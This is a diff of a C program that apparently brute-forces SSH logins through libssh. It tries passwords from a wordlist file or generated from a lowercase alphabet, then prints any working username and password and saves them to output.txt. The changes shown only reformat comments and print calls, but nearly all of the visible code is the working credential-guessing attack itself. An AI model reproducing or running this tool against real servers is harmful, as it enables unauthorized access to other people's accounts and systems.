@@ -17,15 +17,11 @@
 
 // characters that will be used in brute force password generation
 // you can also append uppercase letter and numeric value
-
-static const char alphabet[] =
-"abcdefghijklmnopqrstuvwxyz";
-
+static const char alphabet[] = "abcdefghijklmnopqrstuvwxyz";
 static const int alphabetSize = sizeof(alphabet) - 1;
 
 
 // get username from ufile [-uf option]
-
 char *get_username(FILE *uf, char uline[])
 {
     char ch;
@@ -44,8 +40,8 @@ char *get_username(FILE *uf, char uline[])
     return "None";
 }
 
-// get password from pfile [-pf option]
 
+// get password from pfile [-pf option]
 char *get_password(FILE *pf, char pline[])
 {
     char ch;
@@ -66,7 +62,6 @@ char *get_password(FILE *pf, char pline[])
 
 
 // brute force function
-
 void brutepass (char* str, int index, int maxDepth, ssh_session my_ssh_session)
 {
     int rc;
@@ -90,9 +85,13 @@ void brutepass (char* str, int index, int maxDepth, ssh_session my_ssh_session)
                 break;
             }
             else if (rc == SSH_AUTH_AGAIN) {
-                // if there are too many authentication failure, exit the program 
+                // if there are too many authentication failure,
+                // Exit the program 
                 printf("\n");
-                fprintf(stderr, "Error authenticating with password: %s\n", ssh_get_error(my_ssh_session));
+                fprintf(
+                    stderr,
+                    "Error authenticating with password: %s\n",
+                    ssh_get_error(my_ssh_session));
                 exit(-1);
             }
             else {
@@ -174,7 +173,10 @@ int main(int argc, char *argv[])
         // connecting to ssh server
         rc = ssh_connect(my_ssh_session);
         if (rc != SSH_OK) {
-            fprintf(stderr, "Error connecting to localhost: %s\n", ssh_get_error(my_ssh_session));
+            fprintf(
+                stderr,
+                "Error connecting to localhost: %s\n",
+                ssh_get_error(my_ssh_session));
             ssh_free(my_ssh_session);
             exit(-1);
         }
@@ -183,7 +185,8 @@ int main(int argc, char *argv[])
         if (brute == 0) {
             FILE *pf;
             pf = fopen(password_file, "r");
-            while (connected == 0 && (pname = get_password(pf,pline)) != "None") {
+            while(connected == 0 && (pname = get_password(pf,pline)) != "None")
+            {
                 printf("[+] Password: %s -> ", pline);
                 // checking for password authentication
                 rc = ssh_userauth_password(my_ssh_session, NULL, pname);
@@ -192,17 +195,28 @@ int main(int argc, char *argv[])
                     // then write the username and password to output file
                     connected = 1;
                     printf("Connected\n");
-                    printf("\n\n[*] Username: %s\n[*] Password: %s\n", uname, pname);
+                    printf(
+                        "\n\n[*] Username: %s\n[*] Password: %s\n",
+                        uname,
+                        pname);
                     FILE *of; // writing output to file
                     of = fopen("output.txt","w");
-                    fprintf(of, "\n\n[*] Username: %s\n[*] Password: %s\n", uname, pname);
+                    fprintf(
+                        of,
+                        "\n\n[*] Username: %s\n[*] Password: %s\n",
+                        uname,
+                        pname);
                     fclose(of);
                     break;
                 }
                 else if (rc == SSH_AUTH_AGAIN) {
                     printf("\n");
-                    // if there are too many authentication failure, exit the program 
-                    fprintf(stderr, "Error authenticating with password: %s\n", ssh_get_error(my_ssh_session));
+                    // if there are too many authentication failure
+                    // exit the program 
+                    fprintf(
+                        stderr,
+                        "Error authenticating with password: %s\n",
+                        ssh_get_error(my_ssh_session));
                     exit(-1);
                 }
                 else {
